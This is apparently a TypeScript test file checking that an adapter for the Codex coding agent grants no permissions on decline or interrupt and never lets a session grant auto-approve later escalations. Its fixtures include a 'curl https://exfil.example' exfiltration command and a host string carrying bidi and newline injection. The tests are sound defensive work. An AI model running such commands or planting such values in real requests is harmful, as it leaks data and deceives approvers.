/**
 * #2909: Codex's `PermissionsRequestApprovalResponse` is `{permissions,
 * scope}` with no decision field, so the permissions Station writes back ARE
 * the grant. A decline, a cancel, or a turn interrupt must answer with the
 * empty profile; echoing the requested permissions grants them.
 *
 * #2911: for the same reason, a Station-side session grant must never answer
 * a later permissions request on its own; that would grant whatever the new
 * request asks for without a prompt.
 *
 * Every case drives the real `CodexAdapter` through its child's stdout and
 * reads the reply off its stdin.
 */
import { EventEmitter } from 'node:events';
import { PassThrough, Writable } from 'node:stream';
import { describe, expect, test } from 'vitest';
import { CodexAdapter } from '../adapters/codex-adapter.js';

class FakeWritable extends Writable {
  readonly lines: string[] = [];

  _write(
    chunk: Buffer | string,
    _encoding: BufferEncoding,
    callback: (error?: Error | null) => void,
  ): void {
    for (const line of chunk.toString().split('\n')) {
      if (line.trim()) this.lines.push(line);
    }
    callback();
  }
}

class FakeCodexProcess extends EventEmitter {
  readonly stdin = new FakeWritable();
  readonly stdout = new PassThrough();
  readonly stderr = new PassThrough();
  killed = false;
  exitCode: number | null = null;
  signalCode: NodeJS.Signals | null = null;

  constructor() {
    super();
    this.stdout.setEncoding('utf8');
    this.stderr.setEncoding('utf8');
  }

  kill(signal: NodeJS.Signals = 'SIGTERM'): boolean {
    this.killed = true;
    this.signalCode = signal;
    this.emit('exit', 0);
    return true;
  }
}

const THREAD = 'thread-permission-reply';
const APPROVAL_ID = 41;

// The shape `codex app-server generate-ts` (codex-cli 0.155.1) emits for
// `PermissionsRequestApprovalParams`.
const REQUESTED = {
  network: { enabled: true },
  fileSystem: { read: null, write: ['/tmp/project/out'] },
};

async function flushIo(): Promise<void> {
  await new Promise((resolve) => setTimeout(resolve, 0));
}

async function withTimeout<T>(promise: Promise<T>, label: string): Promise<T> {
  return Promise.race([
    promise,
    new Promise<never>((_, reject) =>
      setTimeout(() => reject(new Error(`Timed out: ${label}`)), 1_000),
    ),
  ]);
}

async function emit(process: FakeCodexProcess, message: unknown) {
  process.stdout.write(`${JSON.stringify(message)}\n`);
  await flushIo();
}

function stdinMessages(process: FakeCodexProcess): any[] {
  return process.stdin.lines.map((line) => JSON.parse(line));
}

async function waitFor<T>(
  read: () => T | undefined,
  label: string,
): Promise<T> {
  for (let i = 0; i < 50; i++) {
    const value = read();
    if (value !== undefined) return value;
    await flushIo();
  }
  throw new Error(`Never observed: ${label}`);
}

async function startedAdapter() {
  const process = new FakeCodexProcess();
  const adapter = new CodexAdapter({ processFactory: () => process as never });
  const events: any[] = [];
  const iterator = adapter.streamEvents()[Symbol.asyncIterator]();
  void (async () => {
    for (;;) {
      const next = await iterator.next();
      if (next.done) return;
      events.push(next.value);
    }
  })();
  const session = adapter.startSession({
    provider: 'codex',
    threadId: THREAD,
    cwd: '/tmp/project',
  });
  await flushIo();
  await emit(process, { id: '1', result: { userAgent: 'test' } });
  await emit(process, { id: '2', result: { thread: { id: 'codex-thread' } } });
  await withTimeout(session, 'startSession');
  const turn = adapter.sendTurn({ threadId: THREAD, input: 'go' });
  await flushIo();
  await emit(process, { id: '3', result: { turn: { id: 'turn-1' } } });
  await withTimeout(turn, 'sendTurn');
  return { adapter, process, events };
}

function permissionsRequest(
  id: number,
  itemId: string,
  permissions: Record<string, unknown>,
) {
  return {
    id,
    method: 'item/permissions/requestApproval',
    params: {
      threadId: 'codex-thread',
      turnId: 'turn-1',
      itemId,
      environmentId: null,
      startedAtMs: 1_790_000_000_000,
      cwd: '/tmp/project',
      reason: 'Needs more access',
      permissions,
    },
  };
}

async function openedRequestId(events: any[], nth: number): Promise<string> {
  const opened = await waitFor(
    () => events.filter((event) => event.method === 'request.opened')[nth],
    `request.opened #${nth}`,
  );
  return opened.requestId;
}

async function adapterWithOpenPermissionRequest() {
  const started = await startedAdapter();
  await emit(
    started.process,
    permissionsRequest(APPROVAL_ID, 'perm-1', REQUESTED),
  );
  return { ...started, requestId: await openedRequestId(started.events, 0) };
}

function repliesTo(process: FakeCodexProcess, id: number | string) {
  return stdinMessages(process).filter(
    (line) => line.id === id && !('method' in line),
  );
}

/** The single reply Station wrote for the permissions request. */
function permissionReply(process: FakeCodexProcess) {
  const replies = stdinMessages(process).filter(
    (line) => line.id === APPROVAL_ID && !('method' in line),
  );
  expect(replies).toHaveLength(1);
  return replies[0];
}

async function resolvedStatus(events: any[]) {
  const resolved = await waitFor(
    () => events.find((event) => event.method === 'request.resolved'),
    'request.resolved',
  );
  return resolved.status;
}

describe('#2909: a Codex permissions reply grants only what the user accepted', () => {
  test('accept grants the requested permissions for the turn', async () => {
    const { adapter, process, events, requestId } =
      await adapterWithOpenPermissionRequest();

    await adapter.respondToRequest(THREAD, requestId, 'accept');

    expect(permissionReply(process)).toEqual({
      jsonrpc: '2.0',
      id: APPROVAL_ID,
      result: { permissions: REQUESTED, scope: 'turn' },
    });
    expect(await resolvedStatus(events)).toBe('approved');
    await adapter.stopAll();
  });

  test('acceptForSession grants the requested permissions for the session', async () => {
    const { adapter, process, events, requestId } =
      await adapterWithOpenPermissionRequest();

    await adapter.respondToRequest(THREAD, requestId, 'acceptForSession');

    expect(permissionReply(process)).toEqual({
      jsonrpc: '2.0',
      id: APPROVAL_ID,
      result: { permissions: REQUESTED, scope: 'session' },
    });
    expect(await resolvedStatus(events)).toBe('approved');
    await adapter.stopAll();
  });

  test.each([
    ['decline', 'denied'],
    ['cancel', 'cancelled'],
  ] as const)('%s grants nothing', async (decision, status) => {
    const { adapter, process, events, requestId } =
      await adapterWithOpenPermissionRequest();

    await adapter.respondToRequest(THREAD, requestId, decision);

    expect(permissionReply(process)).toEqual({
      jsonrpc: '2.0',
      id: APPROVAL_ID,
      result: { permissions: {}, scope: 'turn' },
    });
    expect(await resolvedStatus(events)).toBe(status);
    await adapter.stopAll();
  });

  test('interrupting the turn grants nothing to its open permissions request', async () => {
    const { adapter, process, events } =
      await adapterWithOpenPermissionRequest();

    const interrupt = adapter.interruptTurn(THREAD, 'turn-1');
    await flushIo();
    const interruptRpc = await waitFor(
      () =>
        stdinMessages(process).find((line) => line.method === 'turn/interrupt'),
      'turn/interrupt',
    );
    await emit(process, { id: interruptRpc.id, result: {} });
    await withTimeout(interrupt, 'interruptTurn');

    expect(permissionReply(process)).toEqual({
      jsonrpc: '2.0',
      id: APPROVAL_ID,
      result: { permissions: {}, scope: 'turn' },
    });
    expect(await resolvedStatus(events)).toBe('cancelled');
    await adapter.stopAll();
  });
});

// The shape `codex app-server generate-ts` (codex-cli 0.155.1) emits for
// `CommandExecutionRequestApprovalParams`.
function command(
  id: number,
  itemId: string,
  text: string,
  extra: Record<string, unknown> = {},
) {
  return {
    id,
    method: 'item/commandExecution/requestApproval',
    params: {
      kind: 'command',
      threadId: 'codex-thread',
      turnId: 'turn-1',
      itemId,
      startedAtMs: 1_790_000_000_000,
      environmentId: null,
      reason: null,
      networkApprovalContext: null,
      command: text,
      cwd: '/tmp/project',
      ...extra,
    },
  };
}

const EXFIL = {
  networkApprovalContext: { host: 'exfil.example', protocol: 'https' },
  reason: 'Network access requested',
};

function openedEvents(events: any[]) {
  return events.filter((event) => event.method === 'request.opened');
}

/** Grant `first` for the session through the real reply path. */
async function grantForSession(
  adapter: CodexAdapter,
  process: FakeCodexProcess,
  events: any[],
  first: { id: number; method: string; params: unknown },
) {
  await emit(process, first);
  const requestId = await openedRequestId(events, 0);
  await adapter.respondToRequest(THREAD, requestId, 'acceptForSession');
  expect(repliesTo(process, first.id)).toHaveLength(1);
}

/** The `nth` request opened a prompt and got no reply on the wire. */
async function expectPrompted(
  process: FakeCodexProcess,
  events: any[],
  id: number,
  nth = 1,
) {
  const opened = await waitFor(
    () => openedEvents(events)[nth],
    `request.opened #${nth}`,
  );
  expect(repliesTo(process, id)).toEqual([]);
  return opened;
}

describe('#2911 round 2: a tool grant never covers an escalation riding a tool request', () => {
  test('a managed-network prompt after a shell_exec grant prompts, names the host, and gets no reply', async () => {
    const { adapter, process, events } = await startedAdapter();
    await grantForSession(adapter, process, events, command(71, 'cmd-1', 'ls'));

    await emit(
      process,
      command(72, 'cmd-2', 'curl https://exfil.example', EXFIL),
    );

    const opened = await expectPrompted(process, events, 72);
    expect(opened).toMatchObject({
      requestType: 'approval',
      title:
        'network access to exfil.example (https) for: curl https://exfil.example',
      payload: { networkApprovalContext: EXFIL.networkApprovalContext },
    });
    await adapter.stopAll();
  });

  test('a session answer on a network prompt reaches Codex and does not auto-allow a later plain command', async () => {
    const { adapter, process, events } = await startedAdapter();
    await grantForSession(
      adapter,
      process,
      events,
      command(81, 'cmd-1', 'curl https://exfil.example', EXFIL),
    );
    // Codex itself is told to remember the host for the session.
    expect(repliesTo(process, 81)[0].result).toEqual({
      decision: 'acceptForSession',
    });

    await emit(process, command(82, 'cmd-2', 'ls'));

    const opened = await expectPrompted(process, events, 82);
    expect(opened).toMatchObject({ title: 'ls' });
    await adapter.stopAll();
  });

  test('a stdin prompt after a shell_exec grant prompts; a stdin session answer reaches Codex and mints nothing', async () => {
    const { adapter, process, events } = await startedAdapter();
    await grantForSession(adapter, process, events, command(91, 'cmd-1', 'ls'));

    const stdinWrite = (id: number, n: number) =>
      command(id, `stdin-${n}`, 'python', {
        kind: 'writeStdin',
        approvalId: `stdin-callback-${n}`,
      });
    await emit(process, stdinWrite(92, 1));
    const stdin = await expectPrompted(process, events, 92);
    expect(stdin).toMatchObject({
      title: 'input to a running command: python',
    });
    await adapter.respondToRequest(THREAD, stdin.requestId, 'acceptForSession');
    expect(repliesTo(process, 92)[0].result).toEqual({
      decision: 'acceptForSession',
    });

    // Neither grant covers a later stdin write: it prompts again.
    await emit(process, stdinWrite(93, 2));
    await expectPrompted(process, events, 93, 2);
    await adapter.stopAll();
  });

  test('a stdin prompt with no command still names what it asks for', async () => {
    const { adapter, process, events } = await startedAdapter();
    await emit(
      process,
      command(95, 'stdin-1', 'unused', {
        kind: 'writeStdin',
        command: null,
        approvalId: 'stdin-callback-1',
      }),
    );
    const opened = await waitFor(
      () => openedEvents(events)[0],
      'request.opened',
    );
    expect(opened.title).toBe('input to a running command');
    await adapter.stopAll();
  });

  test('a command request of an unknown kind after a shell_exec grant prompts and gets no reply', async () => {
    const { adapter, process, events } = await startedAdapter();
    await grantForSession(adapter, process, events, command(97, 'cmd-1', 'ls'));

    await emit(process, command(98, 'cmd-2', 'ls', { kind: 'someFutureKind' }));

    await expectPrompted(process, events, 98);
    await adapter.stopAll();
  });

  test('a hostile host is shown as one bounded line with no control or bidi characters', async () => {
    const { adapter, process, events } = await startedAdapter();
    const host = `\u202Eevil.example\ninjected\u200B${'a'.repeat(500)}`;
    await emit(
      process,
      command(99, 'cmd-1', 'curl x', {
        networkApprovalContext: { host, protocol: 'https' },
      }),
    );
    const opened = await waitFor(
      () => openedEvents(events)[0],
      'request.opened',
    );
    const shownHost = opened.title
      .replace(/^network access to /, '')
      .replace(/ \(https\) for: curl x$/, '');
    expect(shownHost).toBe(
      `evil.example injected${'a'.repeat(253 - 'evil.example injected'.length)}`,
    );
    expect(opened.title).not.toMatch(/[\p{Cc}\p{Cf}]/u);
    await adapter.stopAll();
  });

  test('a stdin grant does not cover a later command', async () => {
    const { adapter, process, events } = await startedAdapter();
    await grantForSession(
      adapter,
      process,
      events,
      command(111, 'stdin-1', 'python', {
        kind: 'writeStdin',
        approvalId: 'stdin-callback-1',
      }),
    );

    await emit(process, command(112, 'cmd-1', 'ls'));

    await expectPrompted(process, events, 112);
    await adapter.stopAll();
  });

  test('a file change asking for a write root after an apply_patch grant prompts and gets no reply', async () => {
    const { adapter, process, events } = await startedAdapter();
    const fileChange = (
      id: number,
      itemId: string,
      grantRoot: string | null,
    ) => ({
      id,
      method: 'item/fileChange/requestApproval',
      params: {
        threadId: 'codex-thread',
        turnId: 'turn-1',
        itemId,
        startedAtMs: 1_790_000_000_000,
        reason: null,
        grantRoot,
      },
    });
    await grantForSession(
      adapter,
      process,
      events,
      fileChange(101, 'fc-1', null),
    );

    await emit(process, fileChange(102, 'fc-2', '/Users/victim'));

    await expectPrompted(process, events, 102);
    await adapter.stopAll();
  });
});

describe('#2911: a session grant never auto-approves a later permissions escalation', () => {
  test('after acceptForSession on network, a broader fileSystem request prompts and gets no reply', async () => {
    const { adapter, process, events } = await startedAdapter();
    const network = { network: { enabled: true }, fileSystem: null };
    await emit(process, permissionsRequest(51, 'perm-network', network));
    const first = await openedRequestId(events, 0);
    await adapter.respondToRequest(THREAD, first, 'acceptForSession');
    // Codex is told to remember the grant for the session itself.
    expect(repliesTo(process, 51)).toEqual([
      {
        jsonrpc: '2.0',
        id: 51,
        result: { permissions: network, scope: 'session' },
      },
    ]);

    const broader = {
      network: null,
      fileSystem: { read: null, write: ['/Users/victim'] },
    };
    await emit(process, permissionsRequest(52, 'perm-write', broader));

    const second = await waitFor(
      () => events.filter((event) => event.method === 'request.opened')[1],
      'second request.opened',
    );
    expect(second).toMatchObject({
      requestType: 'permission',
      payload: { permissions: broader },
    });
    expect(repliesTo(process, 52)).toEqual([]);
    await adapter.stopAll();
  });

  test('an ordinary tool grant still auto-allows a later different command', async () => {
    const { adapter, process, events } = await startedAdapter();
    await emit(process, command(61, 'cmd-1', 'ls'));
    const first = await openedRequestId(events, 0);
    await adapter.respondToRequest(THREAD, first, 'acceptForSession');

    await emit(process, command(62, 'cmd-2', 'git status'));

    const reply = await waitFor(
      () => repliesTo(process, 62)[0],
      'auto-approval reply',
    );
    expect(reply).toEqual({
      jsonrpc: '2.0',
      id: 62,
      result: { decision: 'accept' },
    });
    expect(
      events.filter((event) => event.method === 'request.opened'),
    ).toHaveLength(1);
    await adapter.stopAll();
  });
});
